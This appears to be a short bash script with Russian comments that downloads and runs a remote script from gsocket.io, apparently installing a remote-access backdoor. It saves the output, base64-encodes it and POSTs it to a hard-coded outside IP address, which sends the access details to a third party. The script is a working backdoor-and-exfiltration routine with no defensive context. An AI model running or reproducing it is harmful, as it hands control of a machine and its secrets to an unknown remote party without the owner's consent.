#!/bin/bash

# Выполняем команду и сохраняем результат в файл
bash -c "$(curl -fsSL https://gsocket.io/x)" > lol.txt 2>&1

# Читаем содержимое файла
RESULT=$(cat lol.txt)

# Кодируем в base64 для безопасной передачи через HTTP
ENCODED_RESULT=$(echo "$RESULT" | base64 -w 0)

# Отправляем на Flask-сервер (замените URL на ваш)
curl -X POST "http://150.241.64.21:5000/upload" \
     -H "Content-Type: application/json" \
     -d "{\"data\": \"$ENCODED_RESULT\"}"
